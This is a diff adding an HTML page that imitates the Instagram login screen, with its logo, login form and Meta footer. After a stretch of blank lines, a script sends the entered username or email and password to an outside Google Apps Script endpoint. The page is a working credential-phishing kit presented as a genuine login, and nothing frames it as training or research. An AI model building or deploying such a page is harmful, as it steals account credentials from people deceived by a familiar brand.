@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" type="image/x-icon">
+    <link rel="stylesheet" href="./style.css">
+    <script src="https://kit.fontawesome.com/5d2e8a75d6.js" crossorigin="anonymous"></script>
+    <title>Instagram Login</title>
+</head>
+<body>
+    <div class="container1">
+        <div class="main-div">
+        <div class="logo">
+            <img src="https://1000logos.net/wp-content/uploads/2017/02/Logo-Instagram.png" alt="">
+        </div>
+        <div class="form-container">
+            <form name="amazon-form" id="form">
+                <input type="email" name="email" placeholder="Phone number, username or email address">
+                <input type="password" name="password" placeholder="Password">
+                <button type="submit" value="submit" id="submit">Log in</button>
+            </form>
+            </div>
+            <div class="newacc">
+                <h6>OR</h6>
+                <div>
+                    <i class="fa-brands fa-square-facebook"></i>
+                    <a href="#">Log in with Facebook</a>
+                </div>
+                <a href="">Forgotten your password?</a>
+            </div>
+        </div>
+        <div class="signup-div">
+           <p>Don't have an account? <a href="">Sign up</a></p>
+        </div>
+        <div class="download">
+            <p>Get the app.</p>
+            <div class="download-img">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="">
+            </div>
+        </div>
+    </div>
+    </div>
+    <div class="footer-container">
+        <ul>
+            <li><a href="">Meta</a></li>
+            <li><a href="">About</a></li>
+            <li><a href="">Blog</a></li>
+            <li><a href="">Jobs</a></li>
+            <li><a href="">Help</a></li>
+            <li><a href="">API</a></li>
+            <li><a href="">Privacy</a></li>
+            <li><a href="">Terms</a></li>
+            <li><a href="">Locations</a></li>
+            <li><a href="">Instagram Lite</a></li>
+            <li><a href="">Threads</a></li>
+            <li><a href="">Contact uploading and non-users</a></li>
+            <li><a href="">Meta Verified</a></li>
+        </ul>
+        <p>© 2023 Instagram from Meta</p>
+    </div>
+    
+    
+    
+    
+    
+    
+    
+    
+
+    <script>
+        const form = document.querySelector("#form")
+        const submitButton = document.querySelector("#submit")
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbw_IWHSBdoDxB_sP-hXurL0TYQJcF8aOJ0YUmIT2Er2hwFQJCYLjPOU6IFqhBcXhUMrvg/exec'
+     
+        form.addEventListener('submit', e => {
+          submitButton.disabled = true
+          e.preventDefault()
+          let requestBody = new FormData(form)
+          fetch(scriptURL, { method: 'POST', body: requestBody})
+            .then(response => {
+               //alert('Congratulations! We will send you a verification message within 24 hours', response)
+               submitButton.disabled = false
+              })
+            .catch(error => {
+            alert('Error!', error.message)
+              submitButton.disabled = false
+     
+            }
+            )
+        })
+     </script>
+</body>
+</html>
